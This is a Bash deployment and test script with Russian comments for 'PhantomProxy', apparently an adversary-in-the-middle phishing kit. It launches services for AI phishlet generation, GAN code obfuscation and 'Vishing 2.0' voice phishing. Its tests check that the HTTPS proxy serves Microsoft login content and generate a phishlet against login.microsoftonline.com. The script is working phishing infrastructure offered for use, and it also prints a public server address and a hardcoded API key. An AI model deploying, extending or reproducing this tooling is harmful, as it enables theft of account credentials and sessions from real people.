#!/bin/bash
# PhantomProxy v1.7.0 - ФИНАЛЬНАЯ УСТАНОВКА И ТЕСТЫ
# Выполнить на сервере: bash final_install.sh

echo "============================================================"
echo "PHANTOMPROXY v1.7.0 - FINAL INSTALL & FULL TEST"
echo "============================================================"
echo ""

cd ~/phantom-proxy

# 1. Исправление Go
echo "[1/5] Исправление Go модулей..."
go mod tidy 2>&1 | tail -2
go build -o phantom-proxy ./cmd/phantom-proxy 2>&1 | tail -3
chmod +x phantom-proxy
echo "✅ Go готов"
echo ""

# 2. Исправление Python
echo "[2/5] Исправление Python..."

# AI
cd internal/ai && pip3 install -r requirements.txt --break-system-packages -q 2>&1 | tail -1 && cd ../..

# GAN
cd internal/ganobf && pip3 install -r requirements.txt --break-system-packages -q 2>&1 | tail -1 && cd ../..

# ML
cd internal/mlopt && pip3 install -r requirements.txt --break-system-packages -q 2>&1 | tail -1 && cd ../..

# Vishing (без TTS)
cd internal/vishing
sed -i '/TTS/d' requirements.txt
sed -i '/coqui/d' requirements.txt
pip3 install -r requirements.txt --break-system-packages -q 2>&1 | tail -1
cd ../..

echo "✅ Python готов"
echo ""

# 3. Остановка старого
echo "[3/5] Остановка старых процессов..."
pkill -9 -f phantom-proxy 2>/dev/null || true
pkill -9 -f orchestrator.py 2>/dev/null || true
pkill -9 -f 'python3.*main.py' 2>/dev/null || true
sleep 2
echo "✅ Остановлено"
echo ""

# 4. Запуск нового
echo "[4/5] Запуск сервисов..."

# PhantomProxy
nohup ./phantom-proxy -config config.yaml > phantom.log 2>&1 &
sleep 2
echo "  🚀 PhantomProxy"

# AI
cd internal/ai && nohup python3 orchestrator.py > ai.log 2>&1 &
cd ../..
sleep 2
echo "  🚀 AI Orchestrator"

# GAN
cd internal/ganobf && nohup python3 main.py > gan.log 2>&1 &
cd ../..
sleep 2
echo "  🚀 GAN Obfuscation"

# ML
cd internal/mlopt && nohup python3 main.py > ml.log 2>&1 &
cd ../..
sleep 2
echo "  🚀 ML Optimization"

# Vishing
cd internal/vishing && nohup python3 main.py > vishing.log 2>&1 &
cd ../..
sleep 2
echo "  🚀 Vishing 2.0"

echo "  ⏳ Ожидание..."
sleep 10
echo "✅ Запущено"
echo ""

# 5. Тестирование
echo "[5/5] ТЕСТИРОВАНИЕ..."
echo ""

PASSED=0
FAILED=0
TOTAL=0

test_endpoint() {
    local name="$1"
    local url="$2"
    local expected="$3"
    
    TOTAL=$((TOTAL + 1))
    
    result=$(curl -s --connect-timeout 3 "$url" 2>&1)
    
    if echo "$result" | grep -q "$expected"; then
        echo "✅ $name"
        PASSED=$((PASSED + 1))
    else
        echo "❌ $name"
        FAILED=$((FAILED + 1))
        echo "   Output: $result"
    fi
}

echo "=== ПРОВЕРКА СЕРВИСОВ ==="
test_endpoint "Main API Health" "http://localhost:8080/health" '"status":"ok"'
test_endpoint "AI Orchestrator" "http://localhost:8081/health" '"status":"ok"'
test_endpoint "GAN Obfuscation" "http://localhost:8084/health" '"status":"ok"'
test_endpoint "ML Optimization" "http://localhost:8083/health" '"status":"ok"'
test_endpoint "Vishing 2.0" "http://localhost:8082/health" '"status":"ok"'

# HTTPS Proxy
TOTAL=$((TOTAL + 1))
if curl -sk --connect-timeout 3 https://localhost:8443/ 2>&1 | grep -q "Found\|login\|Microsoft"; then
    echo "✅ HTTPS Proxy"
    PASSED=$((PASSED + 1))
else
    echo "❌ HTTPS Proxy"
    FAILED=$((FAILED + 1))
fi

echo ""
echo "=== ФУНКЦИОНАЛЬНЫЕ ТЕСТЫ ==="

# AI Test
TOTAL=$((TOTAL + 1))
ai_result=$(curl -s -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{"target_url":"https://login.microsoftonline.com"}' 2>&1)

if echo "$ai_result" | grep -q '"success":true\|"phishlet"'; then
    echo "✅ AI Phishlet Generation"
    PASSED=$((PASSED + 1))
else
    echo "❌ AI Phishlet Generation"
    FAILED=$((FAILED + 1))
fi

# GAN Test
TOTAL=$((TOTAL + 1))
gan_result=$(curl -s -X POST http://localhost:8084/api/v1/gan/obfuscate \
  -H "Content-Type: application/json" \
  -d '{"code":"var x=1;","level":"high","session_id":"test"}' 2>&1)

if echo "$gan_result" | grep -q '"success":true\|"obfuscated_code"'; then
    echo "✅ GAN Obfuscation"
    PASSED=$((PASSED + 1))
else
    echo "❌ GAN Obfuscation"
    FAILED=$((FAILED + 1))
fi

# ML Test
TOTAL=$((TOTAL + 1))
ml_result=$(curl -s -X POST http://localhost:8083/api/v1/ml/train \
  -H "Content-Type: application/json" \
  -d '{"min_samples":5}' 2>&1)

if echo "$ml_result" | grep -q '"success":true\|"metrics"'; then
    echo "✅ ML Training"
    PASSED=$((PASSED + 1))
else
    echo "❌ ML Training"
    FAILED=$((FAILED + 1))
fi

# Core API Test
TOTAL=$((TOTAL + 1))
core_result=$(curl -s http://localhost:8080/api/v1/stats 2>&1)

if echo "$core_result" | grep -q '"total_sessions"\|"phishlets"'; then
    echo "✅ Core API Stats"
    PASSED=$((PASSED + 1))
else
    echo "❌ Core API Stats"
    FAILED=$((FAILED + 1))
fi

# Session Test
TOTAL=$((TOTAL + 1))
session_result=$(curl -s -X POST http://localhost:8080/api/v1/sessions \
  -H "Content-Type: application/json" \
  -d '{"target_url":"https://test.com"}' 2>&1)

if echo "$session_result" | grep -q '"id"\|"session"'; then
    echo "✅ Session Creation"
    PASSED=$((PASSED + 1))
else
    echo "❌ Session Creation"
    FAILED=$((FAILED + 1))
fi

echo ""
echo "============================================================"
echo "РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ"
echo "============================================================"
echo "Пройдено: $PASSED из $TOTAL"

if [ $TOTAL -gt 0 ]; then
    RATE=$((PASSED * 100 / TOTAL))
    echo "Успешность: $RATE%"
fi

echo ""

if [ $PASSED -eq $TOTAL ]; then
    echo "🎉 ВСЕ ТЕСТЫ ПРОЙДЕНЫ!"
    echo ""
    echo "PhantomProxy v1.7.0 ГОТОВ К РАБОТЕ!"
    echo ""
    echo "Доступные эндпоинты:"
    echo "  Main API:        http://212.233.93.147:8080"
    echo "  AI Orchestrator: http://212.233.93.147:8081"
    echo "  Vishing 2.0:     http://212.233.93.147:8082"
    echo "  ML Optimization: http://212.233.93.147:8083"
    echo "  GAN Obfuscation: http://212.233.93.147:8084"
    echo "  HTTPS Proxy:     https://212.233.93.147:8443"
    echo ""
    echo "API Key: verdebudget-secret-2026"
else
    echo "⚠️ НЕКОТОРЫЕ ТЕСТЫ НЕ ПРОЙДЕНЫ"
    echo ""
    echo "Проверьте логи:"
    echo "  tail -f ~/phantom-proxy/phantom.log"
    echo "  tail -f ~/phantom-proxy/internal/ai/ai.log"
    echo "  tail -f ~/phantom-proxy/internal/ganobf/gan.log"
    echo "  tail -f ~/phantom-proxy/internal/mlopt/ml.log"
    echo "  tail -f ~/phantom-proxy/internal/vishing/vishing.log"
fi

echo "============================================================"

# Сохранение отчёта
cat > test_results.txt << EOF
PHANTOMPROXY v1.7.0 - TEST RESULTS
===================================
Date: $(date)
Passed: $PASSED / $TOTAL
Success Rate: $((PASSED * 100 / TOTAL))%

Services:
- Main API: $(curl -s http://localhost:8080/health | grep -o '"status":"ok"' && echo OK || echo FAIL)
- AI: $(curl -s http://localhost:8081/health | grep -o '"status":"ok"' && echo OK || echo FAIL)
- GAN: $(curl -s http://localhost:8084/health | grep -o '"status":"ok"' && echo OK || echo FAIL)
- ML: $(curl -s http://localhost:8083/health | grep -o '"status":"ok"' && echo OK || echo FAIL)
- Vishing: $(curl -s http://localhost:8082/health | grep -o '"status":"ok"' && echo OK || echo FAIL)
- HTTPS: $(curl -sk https://localhost:8443/ | grep -o 'Found\|login' && echo OK || echo FAIL)
EOF

echo "Отчёт сохранён: test_results.txt"
